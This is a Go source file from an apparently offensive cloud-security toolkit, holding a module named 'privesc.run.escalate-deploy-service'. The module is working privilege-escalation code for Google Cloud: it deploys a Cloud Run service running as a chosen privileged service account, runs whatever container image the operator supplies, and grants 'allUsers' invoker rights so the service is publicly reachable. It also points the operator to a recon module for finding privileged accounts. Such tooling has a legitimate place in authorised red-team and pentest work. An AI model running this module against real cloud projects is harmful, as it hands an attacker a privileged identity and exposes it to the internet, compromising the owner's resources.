package run

import (
	"context"
	"fmt"
	"time"

	runv2 "google.golang.org/api/run/v2"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateDeployService{})
}

// EscalateDeployService deploys a Cloud Run service running as a target service account.
type EscalateDeployService struct{}

func (m *EscalateDeployService) Info() module.Info {
	return module.Info{
		Name:         "privesc.run.escalate-deploy-service",
		Tactic:       module.TacticPrivesc,
		Service:      "run",
		Description:  "Deploy a Cloud Run service as a privileged SA and make it publicly accessible",
		RequiresAuth: true,
	}
}

func (m *EscalateDeployService) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	serviceName := ctx.Flags["service-name"]
	image := ctx.Flags["image"]
	region := ctx.Flags["region"]

	if targetSA == "" || serviceName == "" {
		output.Warn("Usage: run privesc.run.escalate-deploy-service --target-sa <email> --service-name <name> [--image <image>] [--region <region>]")
		output.Info("--target-sa: the service account email to run the service as")
		output.Info("--service-name: name for the new Cloud Run service")
		output.Info("--image: container image (default: us-docker.pkg.dev/cloudrun/container/hello)")
		output.Info("Tip: run 'recon.iam.list-principals' to find privileged SAs.")
		return nil
	}

	if image == "" {
		image = "us-docker.pkg.dev/cloudrun/container/hello"
	}
	if region == "" {
		region = "us-central1"
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := runv2.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create Cloud Run client: %w", err)
	}

	parent := fmt.Sprintf("projects/%s/locations/%s", project, region)

	service := &runv2.GoogleCloudRunV2Service{
		Template: &runv2.GoogleCloudRunV2RevisionTemplate{
			ServiceAccount: targetSA,
			Containers: []*runv2.GoogleCloudRunV2Container{
				{
					Image: image,
				},
			},
		},
		Ingress: "INGRESS_TRAFFIC_ALL",
	}

	output.Info("Creating Cloud Run service %s in %s as %s", serviceName, parent, targetSA)
	output.Info("Image: %s", image)

	op, err := svc.Projects.Locations.Services.Create(parent, service).ServiceId(serviceName).Do()
	if err != nil {
		return fmt.Errorf("create Cloud Run service: %w", err)
	}

	output.Success("Service creation initiated: %s", op.Name)

	// Poll for completion.
	output.Info("Waiting for service to become ready...")
	for i := 0; i < 30; i++ {
		opStatus, err := svc.Projects.Locations.Operations.Get(op.Name).Do()
		if err != nil {
			output.Warn("Error polling operation: %v", err)
			break
		}
		if opStatus.Done {
			output.Success("Service deployment complete.")
			break
		}
		time.Sleep(5 * time.Second)
	}

	// Get the service to find the URL.
	fullName := fmt.Sprintf("%s/services/%s", parent, serviceName)
	deployed, err := svc.Projects.Locations.Services.Get(fullName).Do()
	if err != nil {
		output.Warn("Could not fetch service details: %v", err)
	} else if deployed.Uri != "" {
		output.Success("Service URL: %s", deployed.Uri)
	}

	// Set IAM policy to allow allUsers as invoker for public access.
	output.Info("Setting IAM policy to allow unauthenticated access...")
	policy := &runv2.GoogleIamV1SetIamPolicyRequest{
		Policy: &runv2.GoogleIamV1Policy{
			Bindings: []*runv2.GoogleIamV1Binding{
				{
					Role:    "roles/run.invoker",
					Members: []string{"allUsers"},
				},
			},
		},
	}

	_, err = svc.Projects.Locations.Services.SetIamPolicy(fullName, policy).Do()
	if err != nil {
		output.Warn("Failed to set public IAM policy: %v", err)
		output.Info("The service was created but may not be publicly accessible.")
	} else {
		output.Success("Service is now publicly accessible.")
	}

	if ctx.Findings != nil {
		serviceURL := ""
		if deployed != nil {
			serviceURL = deployed.Uri
		}
		ctx.Findings <- module.Finding{
			Module:      "privesc.run.escalate-deploy-service",
			Severity:    module.SevCritical,
			Title:       "Cloud Run service deployed as privileged SA with public access",
			Description: fmt.Sprintf("Deployed Cloud Run service %s as %s in %s/%s (public, URL: %s)", serviceName, targetSA, project, region, serviceURL),
			Resource:    fullName,
			Project:     project,
			Data: map[string]any{
				"target_sa":    targetSA,
				"image":        image,
				"region":       region,
				"service_url":  serviceURL,
				"public":       true,
			},
		}
	}

	return nil
}
